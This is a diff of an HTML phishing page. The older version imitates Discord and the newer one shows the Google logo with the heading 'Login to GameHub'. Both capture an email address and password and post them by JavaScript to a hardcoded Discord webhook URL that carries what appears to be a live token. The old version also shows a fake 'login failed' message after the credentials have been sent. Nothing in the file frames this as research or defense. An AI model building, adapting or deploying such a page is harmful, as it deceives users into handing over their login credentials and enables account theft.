@@ -1,241 +1,211 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>LOGIN</title>
-  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;700;800&display=swap" rel="stylesheet"/>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
   <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    
-    :root {
-      --bg: #0d0e12;
-      --surface: #13151c;
-      --border: #1e2130;
-      --accent: #5865f2;
-      --accent-glow: rgba(88,101,242,0.35);
-      --green: #57f287;
-      --red: #ed4245;
-      --yellow: #fee75c;
-      --text: #e3e5e8;
-      --muted: #72767d;
-      --mono: 'Share Tech Mono', monospace;
-      --sans: 'Syne', sans-serif;
-    }
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
 
     body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: var(--sans);
+      margin: 0;
       min-height: 100vh;
+      background: #f1f3f4;
+      font-family: 'Roboto', Arial, sans-serif;
       display: flex;
       align-items: center;
       justify-content: center;
+      color: #202124;
       padding: 24px;
-    }
-
-    body::before {
-      content: '';
-      position: fixed;
-      inset: 0;
-      background-image:
-        linear-gradient(rgba(88,101,242,0.04) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(88,101,242,0.04) 1px, transparent 1px);
-      background-size: 40px 40px;
-      pointer-events: none;
-      z-index: 0;
+      box-sizing: border-box;
     }
 
     .card {
-      position: relative;
-      z-index: 1;
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 16px;
-      padding: 40px 40px 36px;
-      width: 100%;
-      max-width: 520px;
-      box-shadow: 0 0 60px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.03) inset;
-      animation: slideUp 0.5s cubic-bezier(0.22,1,0.36,1) both;
+      background: white;
+      width: 380px;
+      padding: 48px 40px 36px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 4px 12px rgba(0,0,0,0.08);
+      text-align: center;
     }
 
-    @keyframes slideUp {
-      from { opacity: 0; transform: translateY(24px); }
-      to   { opacity: 1; transform: translateY(0); }
+    .logo {
+      width: 74px;
+      margin-bottom: 24px;
     }
 
-    .logo-row {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 28px;
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin: 0 0 8px;
     }
 
-    .discord-icon {
-      width: 36px; height: 36px;
-      background: var(--accent);
-      border-radius: 10px;
-      display: grid;
-      place-items: center;
-      flex-shrink: 0;
-      box-shadow: 0 0 16px var(--accent-glow);
+    .subtitle {
+      color: #5f6368;
+      font-size: 16px;
+      margin: 0 0 32px;
     }
-    .discord-icon svg { width: 20px; height: 20px; fill: #fff; }
 
-    h1 { font-size: 1.25rem; font-weight: 800; letter-spacing: -0.02em; color: #fff; }
-    .subtitle { font-size: 0.75rem; color: var(--muted); font-family: var(--mono); margin-top: 1px; }
-
-    .divider { height: 1px; background: var(--border); margin: 0 0 28px; }
-
-    .field { margin-bottom: 18px; }
+    .field {
+      margin-bottom: 20px;
+      text-align: left;
+    }
 
     label {
       display: block;
-      font-size: 0.7rem;
-      font-family: var(--mono);
-      color: var(--muted);
-      text-transform: uppercase;
-      letter-spacing: 0.1em;
-      margin-bottom: 7px;
+      font-size: 14px;
+      margin-bottom: 8px;
+      color: #202124;
     }
 
     input, textarea {
       width: 100%;
-      background: var(--bg);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      color: var(--text);
-      font-family: var(--mono);
-      font-size: 0.82rem;
-      padding: 11px 14px;
-      outline: none;
-      transition: border-color 0.2s, box-shadow 0.2s;
+      padding: 12px 16px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      box-sizing: border-box;
+      font-family: 'Roboto', Arial, sans-serif;
+      color: #202124;
       resize: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
     }
-    input::placeholder, textarea::placeholder { color: #3a3d4a; }
+
     input:focus, textarea:focus {
-      border-color: var(--accent);
-      box-shadow: 0 0 0 3px var(--accent-glow);
+      outline: none;
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 2px rgba(26,115,232,0.25);
     }
-    textarea { min-height: 120px; line-height: 1.55; }
+
+    textarea {
+      min-height: 110px;
+      line-height: 1.5;
+    }
 
     .char-count {
-      font-family: var(--mono);
-      font-size: 0.65rem;
-      color: var(--muted);
+      font-size: 11px;
+      color: #5f6368;
       text-align: right;
       margin-top: 4px;
     }
-    .char-count.warn { color: var(--yellow); }
-    .char-count.over { color: var(--red); }
+    .char-count.warn { color: #f29900; }
+    .char-count.over { color: #d93025; }
 
     .send-btn {
       width: 100%;
-      margin-top: 8px;
-      padding: 14px;
-      background: var(--accent);
-      color: #fff;
+      padding: 12px;
+      background: #1a73e8;
+      color: white;
       border: none;
-      border-radius: 8px;
-      font-family: var(--sans);
-      font-size: 0.9rem;
-      font-weight: 700;
-      letter-spacing: 0.02em;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      font-family: 'Roboto', Arial, sans-serif;
       cursor: pointer;
+      transition: background 0.2s, box-shadow 0.2s;
+      margin: 8px 0 0;
       position: relative;
-      overflow: hidden;
-      transition: background 0.15s, transform 0.1s, box-shadow 0.2s;
-      box-shadow: 0 4px 18px var(--accent-glow);
     }
-    .send-btn:hover:not(:disabled) { background: #4752c4; box-shadow: 0 6px 24px var(--accent-glow); }
-    .send-btn:active:not(:disabled) { transform: scale(0.98); }
-    .send-btn:disabled { background: #2a2d3e; color: var(--muted); cursor: not-allowed; box-shadow: none; }
+
+    .send-btn:hover:not(:disabled) {
+      background: #1765cc;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+    }
+
+    .send-btn:disabled {
+      background: #dadce0;
+      color: #5f6368;
+      cursor: not-allowed;
+    }
 
     .send-btn .btn-text { transition: opacity 0.15s; }
     .send-btn.loading .btn-text { opacity: 0; }
 
-    .spinner { display: none; position: absolute; inset: 0; align-items: center; justify-content: center; }
+    .spinner {
+      display: none;
+      position: absolute;
+      inset: 0;
+      align-items: center;
+      justify-content: center;
+    }
     .send-btn.loading .spinner { display: flex; }
-    .spinner svg { width: 20px; height: 20px; animation: spin 0.7s linear infinite; }
+    .spinner svg {
+      width: 18px; height: 18px;
+      animation: spin 0.7s linear infinite;
+    }
     @keyframes spin { to { transform: rotate(360deg); } }
 
+    .no-webhook-warning {
+      background: #fce8e6;
+      border: 1px solid #f5c6c4;
+      border-radius: 4px;
+      padding: 10px 14px;
+      font-size: 13px;
+      color: #c5221f;
+      margin-bottom: 20px;
+      text-align: left;
+      display: none;
+    }
+    .no-webhook-warning.show { display: block; }
+
+    .footer-links {
+      font-size: 12px;
+      color: #5f6368;
+      text-align: center;
+      margin-top: 28px;
+    }
+    .footer-links a {
+      color: #1a73e8;
+      text-decoration: none;
+      margin: 0 8px;
+    }
+    .footer-links a:hover { text-decoration: underline; }
+
+    /* Toast */
     #toast {
       position: fixed;
-      bottom: 28px;
+      bottom: 24px;
       left: 50%;
-      transform: translateX(-50%) translateY(80px);
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 10px;
-      padding: 12px 20px;
-      font-family: var(--mono);
-      font-size: 0.8rem;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
-      transition: transform 0.35s cubic-bezier(0.22,1,0.36,1), opacity 0.35s;
+      transform: translateX(-50%) translateY(70px);
+      background: #323232;
+      color: #fff;
+      border-radius: 4px;
+      padding: 10px 20px;
+      font-size: 14px;
+      font-family: 'Roboto', Arial, sans-serif;
+      box-shadow: 0 3px 8px rgba(0,0,0,0.3);
+      transition: transform 0.3s cubic-bezier(0.22,1,0.36,1), opacity 0.3s;
       opacity: 0;
       z-index: 999;
       white-space: nowrap;
     }
     #toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
-    #toast.success { border-color: var(--green); }
-    #toast.error   { border-color: var(--red); }
 
-    .dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
-    .success .dot { background: var(--green); box-shadow: 0 0 8px var(--green); }
-    .error   .dot { background: var(--red);   box-shadow: 0 0 8px var(--red); }
-
-    .no-webhook-warning {
-      background: rgba(237,66,69,0.08);
-      border: 1px solid rgba(237,66,69,0.3);
-      border-radius: 8px;
-      padding: 12px 14px;
-      font-family: var(--mono);
-      font-size: 0.75rem;
-      color: var(--red);
-      margin-bottom: 20px;
-      display: none;
-    }
-    .no-webhook-warning.show { display: block; }
-
-    @media (max-width: 480px) {
-      .card { padding: 28px 20px 24px; }
+    @media (max-width: 460px) {
+      .card { padding: 32px 24px 28px; }
     }
   </style>
 </head>
 <body>
 
 <div class="card">
-  <div class="logo-row">
-    <div class="discord-icon">
-      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.056 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/>
-      </svg>
-    </div>
-    <div>
-      <h1>Please Log In</h1>
-      <div class="subtitle"></div>
-    </div>
-  </div>
-
-  <div class="divider"></div>
+  <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+  <h1>Login</h1>
+  <p class="subtitle">to GameHub</p>
 
   <div class="no-webhook-warning" id="noWebhookWarning">
-    ⚠ ERROR ⚠
-    INVALID LOGIN
+    ERROR - INVALID LOGIN
   </div>
 
   <div class="field">
-    <label>Email Adress</label>
-    <input type="text" id="usernameOverride" placeholder="examplemail@exampledomain.com" maxlength="80"/>
+    <label>Email</label>
+    <input type="text" id="usernameOverride" placeholder="examplemail@exampledomain" maxlength="80"/>
   </div>
 
   <div class="field">
     <label>Password</label>
-    <textarea id="messageContent" placeholder="Enter Password" maxlength="50"></textarea>
-    <div class="char-count" id="charCount"></div>
+    <textarea id="messageContent" placeholder="Type something..." maxlength="25"></textarea>
+    <div class="char-count" id="charCount">0 / 25</div>
   </div>
 
   <button class="send-btn" id="sendBtn" onclick="sendWebhook()">
@@ -246,12 +216,14 @@
       </svg>
     </span>
   </button>
+
+  <div class="footer-links">
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </div>
 </div>
 
-<div id="toast">
-  <div class="dot"></div>
-  <span id="toastMsg"></span>
-</div>
+<div id="toast"></div>
 
 <script>
   // ============================================================
@@ -260,35 +232,33 @@
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1483108540498317353/UeFUhTCJ1gLiBGnnSd-xmRpu_STI5pvpe4bVB4mtHSDUvgvkZkMepeNZXksCUGmcm7jZ";
   // ============================================================
 
-  // Warn if no URL is set
   if (!WEBHOOK_URL) {
     document.getElementById('noWebhookWarning').classList.add('show');
     document.getElementById('sendBtn').disabled = true;
   }
 
-  // Char counter
   const msgEl = document.getElementById('messageContent');
-  const charCount = document.getElementById('charCount');
+  const charCountEl = document.getElementById('charCount');
+
   msgEl.addEventListener('input', () => {
     const len = msgEl.value.length;
-    charCount.textContent = `${len} / 15`;
-    charCount.className = 'char-count' + (len > 14 ? ' warn' : '') + (len >= 15 ? ' over' : '');
+    charCountEl.textContent = `${len} / 25`;
+    charCountEl.className = 'char-count' + (len > 1900 ? ' warn' : '') + (len >= 25 ? ' over' : '');
   });
 
   let toastTimer;
-  function showToast(msg, type) {
+  function showToast(msg) {
     const toast = document.getElementById('toast');
-    document.getElementById('toastMsg').textContent = msg;
-    toast.className = `show ${type}`;
+    toast.textContent = msg;
+    toast.classList.add('show');
     clearTimeout(toastTimer);
-    toastTimer = setTimeout(() => { toast.className = type; }, 3500);
+    toastTimer = setTimeout(() => toast.classList.remove('show'), 3000);
   }
 
   async function sendWebhook() {
     const content  = msgEl.value.trim();
     const username = document.getElementById('usernameOverride').value.trim();
-
-    if (!content) { showToast('Login cannot be empty.', 'error'); return; }
+    if (!content) { showToast('Message cannot be empty.'); return; }
 
     const btn = document.getElementById('sendBtn');
     btn.classList.add('loading');
@@ -303,30 +273,27 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
       });
-
       if (res.ok || res.status === 204) {
-        showToast('Login failed, please try again soon', '');
+        showToast('Message sent!');
         msgEl.value = '';
-        charCount.textContent = '0 / 2000';
-        charCount.className = 'char-count';
+        charCountEl.textContent = '0 / 25';
+        charCountEl.className = 'char-count';
       } else {
         let errMsg = `Error ${res.status}`;
         try { const j = await res.json(); if (j.message) errMsg += `: ${j.message}`; } catch {}
-        showToast(errMsg, 'error');
+        showToast(errMsg);
       }
-    } catch (err) {
-      showToast('Network error — check the webhook URL.', 'error');
+    } catch {
+      showToast('Network error — check the webhook URL.');
     } finally {
       btn.classList.remove('loading');
       btn.disabled = false;
     }
   }
 
-  // Ctrl+Enter to send
   msgEl.addEventListener('keydown', e => {
     if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) sendWebhook();
   });
 </script>
 </body>
 </html>
-
